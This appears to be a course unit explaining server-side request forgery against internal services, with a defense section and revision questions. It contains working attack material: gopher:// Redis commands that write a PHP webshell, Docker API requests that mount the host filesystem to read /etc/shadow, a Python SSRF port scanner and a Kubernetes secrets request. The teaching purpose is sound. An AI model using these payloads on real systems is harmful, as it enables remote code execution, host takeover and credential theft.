# Unit 10: A10 - Server-Side Request Forgery (SSRF) — Topic 3: Internal Service Access

## Overview

Beyond cloud metadata, SSRF enables attackers to **access internal services** that are not exposed to the internet — databases, caches, admin panels, microservices, and management interfaces. These internal services often have **no authentication** because they rely on network-level access control ("if you can reach it, you're trusted").

---

## 1. Internal Services Targeted by SSRF

```
┌─────────────────────────────────────────────────────────────────┐
│           INTERNAL SERVICES ACCESSIBLE VIA SSRF                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  DATABASES:                                                    │
│  ├── Redis (6379) — No auth by default                         │
│  ├── Memcached (11211) — No auth by default                    │
│  ├── MongoDB (27017) — Often no auth                           │
│  ├── Elasticsearch (9200) — Often no auth                      │
│  ├── CouchDB (5984) — Often no auth                            │
│  └── MySQL (3306)                                              │
│                                                                 │
│  MANAGEMENT INTERFACES:                                        │
│  ├── Docker API (2375) — Full container control                │
│  ├── Kubernetes API (6443/8443)                                │
│  ├── Consul (8500) — Service discovery + KV store              │
│  ├── etcd (2379) — Cluster state + secrets                     │
│  └── Jenkins (8080) — CI/CD pipeline                           │
│                                                                 │
│  ADMIN PANELS:                                                 │
│  ├── Internal admin dashboard (/admin)                         │
│  ├── phpMyAdmin                                                │
│  ├── Kibana (5601)                                             │
│  ├── Grafana (3000)                                            │
│  └── RabbitMQ Management (15672)                               │
│                                                                 │
│  MICROSERVICES:                                                │
│  ├── Internal APIs (no auth between services)                  │
│  ├── gRPC services                                             │
│  └── Service mesh endpoints                                    │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. SSRF to Redis RCE

```
Redis on port 6379 — typically no authentication internally:

# Using gopher:// protocol for Redis commands via SSRF
gopher://redis:6379/_*3%0d%0a$3%0d%0aSET%0d%0a$4%0d%0atest%0d%0a$11%0d%0ahello+world%0d%0a

# Translated Redis command:
SET test "hello world"

# SSRF to Redis — Write webshell via SLAVEOF or CONFIG SET:
# Step 1: Set Redis dir to webroot
gopher://redis:6379/_CONFIG SET dir /var/www/html
# Step 2: Set dbfilename to PHP file
gopher://redis:6379/_CONFIG SET dbfilename shell.php
# Step 3: Set key with PHP webshell content
gopher://redis:6379/_SET shell "<?php system($_GET['cmd']); ?>"
# Step 4: Save to disk
gopher://redis:6379/_SAVE

# Result: PHP webshell written to /var/www/html/shell.php
# Access: http://target.com/shell.php?cmd=whoami
```

---

## 3. SSRF to Docker API

```
Docker API on port 2375 (unencrypted) — FULL HOST CONTROL:

# List containers
http://docker-host:2375/containers/json

# Create a privileged container with host filesystem mounted
POST http://docker-host:2375/containers/create
{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "cat /host/etc/shadow"],
  "Binds": ["/:/host"],
  "Privileged": true
}

# Start the container
POST http://docker-host:2375/containers/{id}/start

# Read output — contains /etc/shadow from HOST
GET http://docker-host:2375/containers/{id}/logs?stdout=true

# Impact: Full root access to the host machine
```

---

## 4. SSRF for Internal Port Scanning

```python
# Use SSRF to discover internal services (blind SSRF)

import requests
import time

target = "https://vulnerable-app.com/api/fetch?url="
internal_network = "10.0.0."
common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]

for host in range(1, 255):
    for port in common_ports:
        url = f"http://{internal_network}{host}:{port}/"
        start = time.time()
        try:
            r = requests.get(target + url, timeout=5)
            elapsed = time.time() - start
            
            if r.status_code != 500 or elapsed < 2:
                print(f"[OPEN] {internal_network}{host}:{port} "
                      f"(status={r.status_code}, time={elapsed:.2f}s)")
        except:
            pass
```

---

## 5. SSRF to Internal APIs

```
MICROSERVICE ARCHITECTURE — Trust Between Services:

Internet → [API Gateway] → [Auth Service] → [User Service]
                                           → [Payment Service]
                                           → [Admin Service]

Normally: API Gateway enforces auth before forwarding
With SSRF: Attacker bypasses API Gateway, talks directly to services

EXAMPLE — Bypass authentication:
  # Normal request (goes through auth):
  GET /api/users/1 
  Authorization: Bearer <token>
  
  # SSRF request (bypasses auth, hits internal service directly):
  GET http://user-service:8080/internal/users/1
  → No auth required for internal-to-internal calls!

  # Admin endpoint only accessible internally:
  GET http://admin-service:8080/internal/admin/delete-user/1
  → Service trusts the request because it comes from internal IP

WORST CASE — SSRF to Kubernetes API:
  GET https://kubernetes.default.svc/api/v1/secrets
  Authorization: Bearer <service-account-token-from-filesystem>
  → Returns all secrets in the cluster!
```

---

## 6. Defense

```
NETWORK SEGMENTATION:
├── Don't put app servers on the same network as databases
├── Use security groups / network policies to restrict access
├── Internal services should STILL require authentication
└── Zero-trust: verify every request regardless of source

SERVICE AUTHENTICATION:
├── mTLS between microservices (mutual TLS)
├── Service mesh (Istio, Linkerd) for identity
├── JWT tokens for service-to-service calls
└── Never rely solely on network position for trust

MONITORING:
├── Alert on unusual internal traffic patterns
├── Log all inter-service API calls
├── Detect port scanning behavior
└── Monitor for access to metadata endpoints
```

---

## Summary Table

| Internal Service | Port | Risk | Impact |
|-----------------|------|------|--------|
| Redis | 6379 | Critical | RCE via webshell |
| Docker API | 2375 | Critical | Full host control |
| Kubernetes API | 6443 | Critical | Cluster secrets |
| Elasticsearch | 9200 | High | Data theft |
| Admin panels | Various | High | Unauthorized admin access |
| Microservices | Various | High | Auth bypass |

---

## Revision Questions

1. Why are internal services particularly vulnerable when accessed via SSRF?
2. Demonstrate how SSRF to Redis can lead to remote code execution.
3. How can SSRF to the Docker API give full host control?
4. Design a port scanning script that uses blind SSRF to discover internal services.
5. How should microservices authenticate each other instead of relying on network trust?
6. What network segmentation strategies prevent SSRF from reaching internal services?

---

*Previous: [02-cloud-metadata-attacks.md](02-cloud-metadata-attacks.md) | Next: [04-ssrf-filter-bypass.md](04-ssrf-filter-bypass.md)*

---

*[Back to README](../README.md)*
